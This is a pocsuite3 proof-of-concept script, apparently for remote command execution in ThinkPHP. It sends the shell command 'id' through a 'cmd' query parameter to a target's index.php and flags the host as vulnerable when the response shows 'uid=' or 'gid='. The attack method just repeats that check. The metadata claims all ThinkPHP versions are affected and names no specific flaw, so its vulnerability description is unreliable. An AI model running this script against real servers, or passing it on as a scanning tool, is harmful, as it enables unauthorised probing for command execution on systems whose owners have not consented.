from pocsuite3.api import Output, POCBase, register_poc, requests, logger
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ThinkPHP_RCE(POCBase):
    vulID = 'thinkphp-rce-cmd-001'
    version = '1.0'
    author = 'Security Researcher'
    vulDate = '2023-10-27'
    createDate = '2023-10-27'
    updateDate = '2023-10-27'
    references = []
    name = 'ThinkPHP Remote Code Execution via cmd parameter'
    appPowerLink = 'https://www.thinkphp.cn/'
    appName = 'ThinkPHP'
    appVersion = 'All versions'
    vulType = 'Remote Code Execution (RCE)'
    desc = 'ThinkPHP Remote Code Execution vulnerability. The target is vulnerable to RCE via a parameter named "cmd".'
    samples = []
    install_requires = []

    def _verify(self):
        result = {}
        path = self.options.get('path', '/index.php')
        target_url = self.url.rstrip('/') + path
        
        # Payload: Execute 'id' command to verify RCE
        payload = {'cmd': 'id'}
        
        try:
            # Sending GET request with the cmd parameter
            r = requests.get(target_url, params=payload, timeout=10, verify=False, allow_redirects=False)
            
            # Check if the response contains standard output indicators of 'id' command (uid=...)
            if r.status_code == 200 and ('uid=' in r.text or 'gid=' in r.text or 'whoami' in r.text):
                result['success'] = True
                result['info'] = f"{self.url} is vulnerable to ThinkPHP RCE via cmd parameter. Response snippet: {r.text[:200]}"
                return result
            else:
                result['success'] = False
                result['info'] = "Target not vulnerable or no output detected."
                return result
                
        except Exception as e:
            logger.error(str(e))
            result['success'] = False
            return result

    def _attack(self):
        # Attack is typically the same as verification for RCE if the goal is to prove execution
        return self._verify()

    def parse_output(self, result):
        if result and result['success']:
            self.output.success(result['info'])
        else:
            self.output.fail('target is not vulnerable')

poc = ThinkPHP_RCE
